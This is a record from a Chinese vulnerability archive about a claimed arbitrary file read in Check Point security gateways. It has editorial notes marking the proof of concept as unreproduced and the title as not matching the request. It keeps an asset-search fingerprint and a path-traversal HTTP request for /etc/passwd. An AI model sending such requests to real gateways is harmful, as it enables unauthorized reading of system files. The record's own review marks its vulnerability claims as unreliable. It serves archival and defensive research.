---
source: "wy876 漏洞文库"
id: "vw-128df3adba40f5b5a0f78023"
entity_id: "ve-128df3adba40f5b5a0f78023"
schema_version: "1"
title: "Check Point MyCRL 文件读取线索（标题与请求路径尚未对应）"
product: "Check Point安全网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "quarantined"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无版本、未解释访问/认证条件"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Check%20Point/CheckPoint%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3MyCRL%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/sa59vno6cykie36p"
source_status: "recorded"
---

# Check Point MyCRL 文件读取线索（标题与请求路径尚未对应）

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Check Point安全网关
- 本文讨论：宣称MyCRL任意文件读取
- 版本、权限与配置前提：无版本、未解释访问/认证条件
- 资料类型：短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

本篇存在关键内容缺失或技术错配，暂不作为可直接复现的漏洞记录。原技术材料保留供回源比对。

### 逐项校订

- 标题及简介写MyCRL接口但实际请求仅/../../../../etc/passwd，完全没有MyCRL路径
- 无响应/协议说明，无法支撑标题机制
- 产品简介混入杂货邮件等错误与泛化功能
- 已落实的文本修订：HTTP 报文围栏改为 http；标题与正文证据对齐。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 请求是否抄漏路径、对应CVE/产品版本待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
  Check Point 安全网关是一种功能强大、可扩展的安全解决方案，旨在保护企业网络免受各种网络威胁和攻击它提供了多种安全功能，包括防火墙、虚拟专用网络（VPN）、入侵检测和预防系统（IDPS）、杂货邮件防护、网络地址转换（NAT）、负载均衡和安全信息和事件管理（SIEM）。这些功能使得Check Point 安全网关能够提供高性能、可扩展性和高度安全的保护，满足大型企业的需求。同时，Check Point 安全网关也提供了灵活的管理界面，易于配置和管理 ，Check Point 安全网关 MyCRL接口处存在任意文件读取漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件，例如客户记录、财务数据或源代码，导致数据泄露。

# 二、影响版本
+ Check Point安全网关

# 三、资产测绘
```plain
app="Check_Point-SSL-Network-Extender"
```


# 四、漏洞复现
```http
GET /../../../../etc/passwd HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sa59vno6cykie36p>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
